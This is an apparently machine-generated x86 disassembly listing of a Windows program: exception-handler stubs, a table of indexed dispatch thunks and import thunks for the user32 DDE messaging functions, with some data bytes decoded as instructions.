jmp eax
sub_468820
retn
sub_468824
mov eax 0x2a
call sub_469314
jmp eax
sub_468830
retn
sub_468834
mov eax 0x2b
call sub_469314
jmp eax
sub_468840
retn
sub_468844
mov eax 0x2c
call sub_469314
jmp eax
sub_468850
retn
sub_468854
mov eax 0x2d
call sub_469314
jmp eax
sub_468860
retn
sub_468864
mov eax 0x2e
call sub_469314
jmp eax
sub_468870
retn
sub_468874
mov eax 0x2f
call sub_469314
jmp eax
sub_468880
retn
sub_468884
mov eax 0x30
call sub_469314
jmp eax
sub_468890
retn
sub_468894
mov eax 0x31
call sub_469314
jmp eax
sub_4688a0
retn
sub_4688a4
mov eax 0x32
call sub_469314
jmp eax
sub_4688b0
retn
sub_4688b4
mov eax 0x33
call sub_469314
jmp eax
sub_4688c0
retn
sub_4688c4
mov eax 0x34
call sub_469314
jmp eax
sub_4688d0
retn
sub_4688d4
mov eax 0x35
call sub_469314
jmp eax
sub_4688e0
retn
sub_4688e4
mov eax 0x36
call sub_469314
jmp eax
sub_4688f0
retn
sub_4688f4
mov eax 0x37
call sub_469314
jmp eax
sub_468900
retn
sub_468904
mov eax 0x38
call sub_469314
jmp eax
sub_468910
retn
sub_468914
mov eax 0x39
call sub_469314
jmp eax
sub_468920
retn
sub_468924
mov eax 0x3a
call sub_469314
jmp eax
sub_468930
retn
sub_468934
mov eax 0x3b
call sub_469314
jmp eax
sub_468940
retn
sub_468944
mov eax 0x3c
call sub_469314
jmp eax
sub_468950
retn
sub_468954
mov eax 0x3d
call sub_469314
jmp eax
sub_468960
retn
sub_468964
mov eax 0x3e
call sub_469314
jmp eax
sub_468970
retn
sub_468974
mov eax 0x3f
call sub_469314
jmp eax
sub_468980
retn
sub_468984
mov eax 0x40
call sub_469314
jmp eax
sub_468990
retn
sub_468994
mov eax 0x41
call sub_469314
jmp eax
sub_4689a0
retn
sub_4689a4
mov eax 0x42
call sub_469314
jmp eax
sub_4689b0
retn
sub_4689b4
mov eax 0x43
call sub_469314
jmp eax
sub_4689c0
retn
sub_4689c4
mov eax 0x44
call sub_469314
jmp eax
sub_4689d0
retn
sub_4689d4
mov eax 0x45
call sub_469314
jmp eax
sub_4689e0
retn
sub_4689e4
mov eax 0x46
call sub_469314
jmp eax
sub_4689f0
retn
sub_4689f4
mov eax 0x47
call sub_469314
jmp eax
sub_468a00
retn
sub_468a04
mov eax 0x48
call sub_469314
jmp eax
sub_468a10
retn
sub_468a14
mov eax 0x49
call sub_469314
jmp eax
sub_468a20
retn
sub_468a24
mov eax 0x4a
call sub_469314
jmp eax
sub_468a30
retn
sub_468a34
mov eax 0x4b
call sub_469314
jmp eax
sub_468a40
retn
sub_468a44
mov eax 0x4c
call sub_469314
jmp eax
sub_468a50
retn
sub_468a54
mov eax 0x4d
call sub_469314
jmp eax
sub_468a60
retn
sub_468a64
mov eax 0x4e
call sub_469314
jmp eax
sub_468a70
retn
sub_468a74
mov eax 0x4f
call sub_469314
jmp eax
sub_468a80
retn
sub_468a84
mov eax 0x50
call sub_469314
jmp eax
sub_468a90
retn
sub_468a94
mov eax 0x51
call sub_469314
jmp eax
sub_468aa0
retn
sub_468aa4
mov eax 0x52
call sub_469314
jmp eax
sub_468ab0
retn
sub_468ab4
mov eax 0x53
call sub_469314
jmp eax
sub_468ac0
retn
sub_468ac4
mov eax 0x54
call sub_469314
jmp eax
sub_468ad0
retn
sub_468ad4
mov eax 0x55
call sub_469314
jmp eax
sub_468ae0
retn
sub_468ae4
mov eax 0x56
call sub_469314
jmp eax
sub_468af0
retn
sub_468af4
mov eax 0x57
call sub_469314
jmp eax
sub_468b00
retn
sub_468b04
mov eax 0x58
call sub_469314
jmp eax
sub_468b10
retn
sub_468b14
mov eax 0x59
call sub_469314
jmp eax
sub_468b20
retn
sub_468b24
mov eax 0x5a
call sub_469314
jmp eax
sub_468b30
retn
sub_468b34
mov eax 0x5b
call sub_469314
jmp eax
sub_468b40
retn
sub_468b44
mov eax 0x5c
call sub_469314
jmp eax
sub_468b50
retn
sub_468b54
mov eax 0x5d
call sub_469314
jmp eax
sub_468b60
retn
sub_468b64
mov eax 0x5e
call sub_469314
jmp eax
sub_468b70
retn
sub_468b74
mov eax 0x5f
call sub_469314
jmp eax
sub_468b80
retn
sub_468b84
mov eax 0x60
call sub_469314
jmp eax
sub_468b90
retn
sub_468b94
mov eax 0x61
call sub_469314
jmp eax
sub_468ba0
retn
sub_468ba4
mov eax 0x62
call sub_469314
jmp eax
sub_468bb0
retn
sub_468bb4
mov eax 0x63
call sub_469314
jmp eax
sub_468bc0
retn
sub_468bc4
mov eax 0x64
call sub_469314
jmp eax
sub_468bd0
retn
sub_468bd4
mov eax 0x65
call sub_469314
jmp eax
sub_468be0
retn
sub_468be4
mov eax 0x66
call sub_469314
jmp eax
sub_468bf0
retn
sub_468bf4
mov eax 0x67
call sub_469314
jmp eax
sub_468c00
retn
sub_468c04
mov eax 0x68
call sub_469314
jmp eax
sub_468c10
retn
sub_468c14
mov eax 0x69
call sub_469314
jmp eax
sub_468c20
retn
sub_468c24
mov eax 0x6a
call sub_469314
jmp eax
sub_468c30
retn
sub_468c34
mov eax 0x6b
call sub_469314
jmp eax
sub_468c40
retn
sub_468c44
mov eax 0x6c
call sub_469314
jmp eax
sub_468c50
retn
sub_468c54
mov eax 0x6d
call sub_469314
jmp eax
sub_468c60
retn
sub_468c64
mov eax 0x6e
call sub_469314
jmp eax
sub_468c70
retn
sub_468c74
mov eax 0x6f
call sub_469314
jmp eax
sub_468c80
retn
sub_4693b7
jmp sub_403b24
sub_4693be
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4694b9
jmp sub_403b24
sub_4694c0
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_469524
jmp sub_403b24
sub_46952b
pop ebp
retn
sub_469530
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4693c8
sub_469565
jmp sub_403b24
sub_46956c
pop ebp
retn
sub_469570
sub [ rw-data ] 0x1
retn
sub_4697fc
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_469808
retn
sub_4698af
jmp sub_403b24
sub_4698b6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46990e
jmp sub_403b24
sub_469915
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46991c
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46993c
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_469d42
jmp sub_403b24
sub_469d49
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469dc8
jmp sub_403b24
sub_469dcf
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469dfd
jmp sub_403b24
sub_469e04
pop ebp
retn
sub_469e08
sub [ rw-data ] 0x1
retn
sub_46a002
jmp sub_403b24
sub_46a009
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a0e4
jmp sub_403b24
sub_46a0eb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a17f
jmp sub_403b24
sub_46a186
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46a1fc
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46a340
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46a3f3
jmp sub_403b24
sub_46a3fa
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46a4d5
jmp sub_403b24
sub_46a4dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a6c8
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46a6d4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_46a6ec
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46a6f8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_40399c#4
jmp sub_40399c
sub_46a7d1
jmp sub_403b24
sub_46a7d8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403870#7
jmp sub_403870
sub_46a901
jmp sub_403b24
sub_46a908
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a914
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46a920
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46a9c6
jmp sub_403b24
sub_46a9cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46aa89
jmp sub_403b24
sub_46aa90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aaad
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_46aaa6
jmp sub_403b24
sub_46aaad
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46ab7b
jmp sub_403b24
sub_46ab82
pop ebx
mov esp ebp
pop ebp
retn
sub_46ab8b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ac2e
jmp sub_403b24
sub_46ac35
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46acce
jmp sub_403b24
sub_46acd5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46ad5a
jmp sub_403b24
sub_46ad61
pop ecx
pop ebp
retn
sub_46ad64
mov eax [ eax + 0x4 ]
retn
sub_46adc2
jmp sub_403b24
sub_46adc9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46aea5
jmp sub_403b24
sub_46aeac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46aeed
jmp sub_403b24
sub_46aef4
pop ebp
retn
sub_46aef8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_469e10 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_46a9f0
sub_46af49
jmp sub_403b24
sub_46af50
pop ebp
retn
sub_46af54
sub [ rw-data ] 0x1
retn
sub_46b037
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add [ eax + esi * 4 + 0x46 ] al
add [ ecx ] dl
add ch [ esi ]
cmp [ eax + eax ] eax
add [ eax ] al
hlt
sub_46b068
adc [ ebx ] eax
xor [ cs : ecx ] dh
add al 0x0
add [ eax ] al
hlt
sub_46b088
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c924
pop esi
pop ebx
retn
sub_46b1df
jmp sub_403b24
sub_46b1e6
pop ebx
pop ecx
pop ebp
retn
sub_46b2b5
jmp sub_403b24
sub_46b2bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46b43f
jmp sub_403b24
sub_46b446
pop ebp
retn
sub_46b51b
jmp sub_403b24
sub_46b522
pop ecx
pop ebp
retn
sub_46b650
retn
j_sub_46b650
jmp sub_46b650
sub_46b658
pop ebp
retn
sub_46b65c
sub [ rw-data ] 0x1
retn
sub_46b689
jmp sub_403b24
sub_46b690
pop ebp
retn
sub_46b694
sub [ rw-data ] 0x1
retn
sub_46b8ee
jmp sub_403b24
sub_46b8f5
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46b97b
jmp sub_403b24
sub_46b982
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403744
sub_46bab4
jmp sub_403b24
sub_46babb
pop ebp
retn
sub_46bac0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46ba2c
call sub_403ecc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4304b4
mov [ rw-data ] eax
sub_46becd
jmp sub_403b24
sub_46bed4
pop ebp
retn
sub_46bed8
sub [ rw-data ] 0x1
retn
sub_46c044
add eax 0x68
call sub_40d7a0
retn
sub_46c0c4
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor eax eax
retn
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_46c124
push ebx
mov ebx eax
mov eax ebx
call sub_423ef8
mov al [ ebx + 0x70 ]
mov [ ebx + 0x70 ] 0x0
mov edx eax
mov eax ebx
call sub_46c140
pop ebx
retn
sub_46c1fd
jmp sub_403b24
sub_46c204
pop ebp
retn
sub_46c208
sub [ rw-data ] 0x1
retn
sub_46c210
pop esp
retn 0x46
sub_46c214
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
retn 0x46
sub_46c384
retn
sub_46c385
jmp sub_403b24
j_sub_46c384
jmp sub_46c384
sub_46c38c
pop ebp
retn
sub_46c390
sub [ rw-data ] 0x1
retn
sub_46c3bd
jmp sub_403b24
sub_46c3c4
pop ebp
retn
sub_46c3c8
sub [ rw-data ] 0x1
retn
sub_46c4f5
jmp sub_403b24
sub_46c4fc
pop ebp
retn
sub_46c500
sub [ rw-data ] 0x1
retn
DdeInitializeA
jmp [ DdeInitializeA@IAT ]
DdeUninitialize
jmp [ DdeUninitialize@IAT ]
DdeConnect
jmp [ __import_lookup_table_16(user32:DdeConnect) ]
DdeDisconnect
jmp [ __import_lookup_table_16(user32:DdeDisconnect) ]
DdeQueryConvInfo
jmp [ DdeQueryConvInfo@IAT ]
DdeSetUserHandle
jmp [ __import_lookup_table_16(user32:DdeSetUserHandle) ]
DdePostAdvise
jmp [ __import_lookup_table_16(user32:DdePostAdvise) ]
DdeNameService
jmp [ DdeNameService@IAT ]
DdeClientTransaction
jmp [ __import_lookup_table_16(user32:DdeClientTransaction) ]
DdeCreateDataHandle
jmp [ __import_lookup_table_16(user32:DdeCreateDataHandle) ]
DdeAccessData
jmp [ __import_lookup_table_16(user32:DdeAccessData) ]
DdeUnaccessData
jmp [ DdeUnaccessData@IAT ]
DdeFreeDataHandle
jmp [ __import_lookup_table_16(user32:DdeFreeDataHandle) ]
DdeGetLastError
jmp [ __import_lookup_table_16(user32:DdeGetLastError) ]
DdeQueryStringA
jmp [ __import_lookup_table_16(user32:DdeQueryStringA) ]
DdeCmpStringHandles
jmp [ __import_lookup_table_16(user32:DdeCmpStringHandles) ]
sub_46c5bd
jmp sub_403b24
sub_46c5c4
pop ebp
retn
sub_46c5c8
sub [ rw-data ] 0x1
retn
sub_46c6d7
adc [ eax ] al
xor al 0x0
add [ eax ] al
hlt
sub_46ca20
out dx al
jmp [ eax - 0x4bffb914 ]
sub_46cede
inc esi
add [ edi + ecx * 8 + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
iretd
sub_46d07e
jmp sub_403b24
sub_46d085
pop ebx
mov esp ebp
pop ebp
retn
sub_46d350
jmp sub_403b24
sub_46d357
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46d4d8
jmp sub_403b24
sub_46d4df
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d61d
jmp sub_403b24
sub_46d624
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46d714
jmp sub_403b24
sub_46d71b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d82a
jmp sub_403b24
sub_46d831
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d8e3
jmp sub_403b24
sub_46d8ea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d8f0
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_41b6d0
pop ebx
retn
sub_46d904
mov eax [ eax + 0x40 ]
call sub_41b7f0
retn
sub_46da4e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_46da5c
jmp sub_403b24
j_sub_46da4e
jmp sub_46da4e
sub_46da63
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46db13
jmp sub_403b24
sub_46db1a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46dbe3
jmp sub_403b24
sub_46dbea
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46df7e
jmp sub_403b24
sub_46df85
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e134
mov [ eax + 0xc6 ] 0x0
retn
sub_46e218
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_46e180
sub_46e238
retn
sub_46e23c
retn
sub_46e240
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404174
pop esi
pop ebx
retn
sub_46e254
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_404174
pop esi
pop ebx
retn
sub_46e268
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_46e288
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46e40b
jmp sub_403b24
sub_46e412
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e524
retn
sub_46e528
retn
sub_46e639
jmp sub_403b24
sub_46e640
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e715
jmp sub_403b24
sub_46e71c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e78c
push ecx
push edx
call DdeAccessData
retn
sub_46e794
push edx
call DdeUnaccessData
retn
sub_46e8b4
mov eax [ eax + 0x10 ]
call sub_46e4b0
retn
sub_46e93c
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_423b78
sub_46ea18
jmp sub_403b24
sub_46ea1f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46eaaf
jmp sub_403b24
sub_46eab6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46eb3f
jmp sub_403b24
sub_46eb46
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46eb50
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46ec8f
jmp sub_403b24
sub_46ec96
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46eca0
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_46ecb4
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_46eeb0
jmp sub_403b24
sub_46eeb7
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46ef97
jmp sub_403b24
sub_46ef9e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46f0c9
jmp sub_403b24
sub_46f0d0
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46f381
jmp sub_403b24
sub_46f388
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f394
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
sub_46f43d
jmp sub_403b24
sub_46f444
pop ebp
retn
sub_46f4f9
jmp sub_403b24
sub_46f500
pop ebp
retn
sub_46f504
sub [ rw-data ] 0x1
retn
sub_46f76f
jmp sub_403b24
sub_46f80a
jmp sub_403b24
sub_46f830
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f6c8
call sub_403b5c
pop ebx
retn
sub_46fa38
jmp sub_403b24
sub_46fa3f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46fae4
jmp sub_403b24
sub_46faeb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46fb96
jmp sub_403b24
sub_46fb9d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46fda8
jmp sub_403b24
sub_46fdaf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4700c8
jmp sub_403b24
sub_4700cf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4700f2
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404b88
retn
sub_4700eb
jmp sub_403b24
sub_4700f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_470210
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
retn
sub_470389
jmp sub_403b24
sub_470390
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_470398
push 0x0
xor ecx ecx
call sub_4702c4
retn
sub_4703a4
xor ecx ecx
mov edx 0x20
call sub_402da4
retn
sub_470662
jmp sub_403b24
sub_470669
pop ebp
retn
sub_470711
jmp sub_403b24
sub_470718
pop ebp
retn
sub_47071c
sub [ rw-data ] 0x1
retn
sub_4707d7
add [ esp + 0x4 ] 0xfffffff4
jmp sub_470b54
sub_4707e1
add [ esp + 0x4 ] 0xfffffff4
jmp sub_470b68
sub_4707f5
add [ esp + 0x4 ] 0xfffffff4
jmp sub_470aa0
sub_4707ff
add [ esp + 0x4 ] 0xfffffff4
jmp sub_470b04
sub_470809
add [ esp + 0x4 ] 0xfffffff4
jmp sub_470b24
sub_470a74
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_470af4
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub_470b54
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_470b68
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_470d02
jmp sub_403b24
sub_470d09
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_470d14
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_470dec
retn
sub_470f3a
jmp sub_403b24
sub_470f41
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470f48
lea ecx [ eax + 0x3c ]
push ecx
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x30 ]
add eax 0x20
xchg edx eax
call sub_46fa58
retn
sub ecx 0xfffffff4
sub_470f64
lea ecx [ eax + 0x3c ]
mov eax [ eax + 0x30 ]
add eax 0x20
xchg edx eax
call sub_46fb04
retn
sub_470f74
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov al [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_470f88
mov [ eax + 0x48 ] dl
retn
sub_470f8c
push ebx
mov ebx eax
mov eax ebx
call sub_470f74
cmp al 0x4
jne r-xdata
mov al [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_470fa4
mov [ eax + 0x40 ] dl
retn
sub_470fd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_470fe0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_471015
jmp sub_403b24
sub_47101c
pop ebp
retn
sub_471020
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
sub_471061
jmp sub_403b24
sub_471068
pop ebp
retn
sub_47106c
sub [ rw-data ] 0x1
retn
sub_471099
jmp sub_403b24
sub_4710a0
pop ebp
retn
sub_4710a4
sub [ rw-data ] 0x1
retn
sub_4710d1
jmp sub_403b24
sub_4710d8
pop ebp
retn
sub_4710dc
sub [ rw-data ] 0x1
retn
sub_47259b
jmp sub_403b24
sub_4725a5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4725ab
add [ esp + esi + 0x49 ] dl
xchg ecx eax
xchg ecx eax
pop edx
iretd
sub_4725b3
adc [ edi + 0xaa0000 ] eax
pushad
cmp ebx [ es : ebp - 0x6e6eb6cc ]
pop edx
iretd
sub_4725c3
adc [ edi + 0xaa0000 ] eax
pushad
cmp ebp [ es : edx + 0x34 ]
dec ecx
xchg ecx eax
xchg ecx eax
pop edx
iretd
sub_4725d3
adc [ edi + 0xaa0000 ] eax
pushad
cmp edx [ es : edi + 0x34 ]
dec ecx
xchg ecx eax
xchg ecx eax
pop edx
iretd
sub_4725e3
adc [ edi + 0xaa0000 ] eax
pushad
cmp edx [ es : ebx + 0x34 ]
dec ecx
xchg ecx eax
xchg ecx eax
pop edx
iretd
sub_4725f3
adc [ edi + 0xaa0000 ] eax
pushad
cmp ebp [ es : ebx + 0x34 ]
dec ecx
xchg ecx eax
xchg ecx eax
pop edx
iretd
sub_472603
adc [ edi + 0xaa0000 ] eax
pushad
cmp ebx edi
xor al 0x49
xchg ecx eax
xchg ecx eax
pop edx
iretd
sub_472660
jmp sub_403b24
sub_472667
pop ebx
pop ecx
pop ebp
retn
sub_472691
jmp sub_403b24
sub_472698
pop ebp
retn
sub_47269c
sub [ rw-data ] 0x1
retn
sub_47272f
add [ esp + 0x4 ] 0xfffffff0
jmp sub_472ec0
sub_472743
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405c24
sub_4727f9
add eax 0xffffffe0
jmp sub_4733d4
sub_47280b
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405c24
sub_47281f
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_472919
add eax 0xffffffe0
jmp sub_47373c
sub_47292b
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405c24
sub_47293f
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_472955
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405c24
sub_472c37
jmp sub_403b24
sub_472c3e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_472c9e
jmp sub_403b24
sub_472ca5
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_472cef
jmp sub_403b24
sub_472cf6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_472d7c
cmp [ eax + 0x18 ] 0x0
jne r-xdata
retn
call sub_472e0c
sub_472df0
jmp sub_403b24
sub_472df7
pop ebx
pop ecx
pop ebp
retn
sub_472e0c
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
mov edx r-xdata
mov eax [ ebx + 0xc ]
call sub_46fb04
lea eax [ ebx + 0xc ]
call sub_405b50
pop ebx
retn
sub_472ea3
jmp sub_403870
sub_472ea8
call sub_472b28
mov ebx eax
call sub_403bd8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_472ec0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_47307f
jmp sub_403b24
sub_4730ac
jmp sub_403b24
sub_4730b3
pop ebx
mov esp ebp
pop ebp
retn
sub_473221
jmp sub_403b24
sub_47324e
jmp sub_403b24
sub_4733a1
jmp sub_403b24
sub_4733a8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473423
jmp sub_403b24
sub_47342a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47342f
add [ edx ] al
loopne r-xdata
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
sub_4734ea
jmp sub_403b24
sub_4734f1
pop ecx
pop ecx
pop ebp
retn
sub_4735ad
jmp sub_403b24
sub_473691
jmp sub_403b24
sub_4736bd
jmp sub_403b24
sub_47371b
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
